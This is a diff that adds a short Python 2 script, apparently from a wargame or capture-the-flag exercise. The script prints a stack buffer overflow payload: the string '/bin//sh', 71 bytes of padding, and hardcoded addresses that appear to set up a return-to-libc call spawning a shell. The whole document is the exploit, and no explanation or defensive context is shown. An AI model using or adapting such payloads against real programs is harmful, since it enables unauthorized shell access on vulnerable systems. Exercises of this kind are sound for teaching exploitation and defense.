@@ -1,0 +1,3 @@
+#!/usr/bin/python
+
+print '/bin//sh\x00' + 'a' * 71 + '\xb0\xff\xec\xb7' + '\x42\x42\x42\x42' + '\xac\xfc\xff\xbf'
